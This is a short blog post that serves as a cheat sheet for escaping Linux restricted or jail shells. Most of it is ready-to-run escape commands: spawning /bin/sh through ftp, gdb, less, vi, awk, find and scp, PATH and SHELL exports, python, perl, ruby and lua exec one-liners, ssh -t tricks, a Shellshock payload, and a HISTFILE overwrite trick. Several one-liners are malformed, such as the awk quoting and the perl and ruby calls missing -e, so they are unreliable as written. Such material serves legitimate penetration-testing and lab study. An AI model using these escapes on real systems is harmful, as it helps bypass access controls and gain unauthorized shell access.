---
layout: default
title: "Breaking out of jail shells"
---
This is a quick post on breaking out of linux jail/restricted shells.

Always run your reconnaissance!  

* Run **env** to list out exported environment variables.
* **echo $SHELL** what shell are we in?
* **echo $PATH** what is our path set to?
* Can you just exploit a running process to escalate privileges and not need to escape out of your shell?
* Run some basic commands what is and isn\'t allowed? **ls,pwd,cp,mv,env,set,export,vi,\.\.\.**  

Quick wins from jail  

* Can you run **cp**? Just copy a file into your path.
  * **`cp /bin/sh /a/dir/from/path; sh`**
* Is \'/\' allowed?
  * Run **`/bin/sh`**
* Can you use **export**?
  * **`export PATH=/bin:/usr/bin:$PATH`**
  * **`export SHELL=/bin/sh`**
* Do you have access to commands that let you execute different system commands?
  * **ftp: `!/bin/sh`**
  * **gdb: `!/bin/sh`**
  * **more/less/man: `?!/bin/sh`**
  * **vi/vim: `:!/bin/sh`**
  * **scp: `scp -S /tmp/naughty.sh x y:`**
  * **awk: `awk 'BEGIN {system('/bin/sh')}'`**
  * **find `find / -name something -exec /bin/sh \;`**
* Don\'t forget about your favorite language!
  * **python: `python -c 'import os; os.system("/bin/bash")'`**
  * **perl: `perl exec "/bin/sh";`**
  * **ruby: `ruby exec "/bin/sh"`**
  * **lua: `lua os.execute('/bin/sh')`**  

Quick wins from outside jail  

* Just execute commands before your shell is loaded.
  * **`ssh user@10.10.10.10 -t "/bin/sh"`**
* Don\'t start the rc profile
  * **`ssh user@10.10.10.10 -t "bash --noprofile"`**
* Try shellshock
  * **`ssh user@10.10.10.10 -t "() { :; }; /bin/bash"`**  

Getting creative  

* Using **tee** to write a script.
  * **`echo 'evil code' | tee script.sh`**
* History file
  * Set **HISTFILE** variable to a file you want to overwrite
  * Set **HISTSIZE** variable to **0** then immediately to **100**
  * Execute lines that should be written to your file
  * Log out and back in again.

Looking for more ways? [Check out this resource here!](http://bfy.tw/8Lq2)
